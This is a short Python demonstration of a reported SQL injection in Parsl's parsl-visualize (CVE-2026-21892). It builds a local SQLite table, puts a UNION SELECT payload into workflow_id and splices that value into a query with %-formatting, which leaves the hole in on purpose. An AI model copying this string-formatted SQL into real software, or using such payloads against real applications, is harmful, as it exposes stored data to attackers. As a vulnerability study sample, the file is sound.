"""
CVE: CVE-2026-21892
Description: Parsl parsl-visualize SQL injection via unsanitized workflow_id in URL routes
Source: https://nvd.nist.gov/vuln/detail/CVE-2026-21892
Pattern: Parsl's parsl.monitoring.visualization views.py constructs SQL queries using
         unsafe Python %-formatting with user-supplied workflow_id from URL parameters.
         The workflow_id is interpolated directly into raw SQL strings without
         parameterization or escaping.
"""

import sqlite3

import pandas as pd


def vulnerable_parsl_visualize_injection():
    conn = sqlite3.connect(":memory:")
    cur = conn.cursor()

    cur.execute(
        "CREATE TABLE task (task_id INTEGER, task_func_name TEXT, run_id TEXT)"
    )
    cur.execute(
        "CREATE TABLE status (task_id INTEGER, run_id TEXT, task_status_name TEXT)"
    )
    cur.execute(
        "INSERT INTO task VALUES (1, 'process_data', 'run-abc'), (2, 'validate', 'run-abc')"
    )
    cur.execute(
        "INSERT INTO status VALUES (1, 'run-abc', 'completed'), (2, 'run-abc', 'failed')"
    )

    workflow_id = "run-abc' UNION SELECT task_id, 'injected', 'data' FROM task--"

    query = (
        "SELECT task.task_id, task.task_func_name, status.task_status_name "
        "FROM task LEFT JOIN status "
        "ON task.task_id = status.task_id "
        "AND task.run_id = status.run_id "
        "WHERE task.run_id='%s'" % workflow_id
    )

    print("[VULNERABLE CVE-2026-21892] Parsl parsl-visualize string-format injection:")
    for row in cur.execute(query).fetchall():
        print(f"  {row}")

    conn.close()


if __name__ == "__main__":
    vulnerable_parsl_visualize_injection()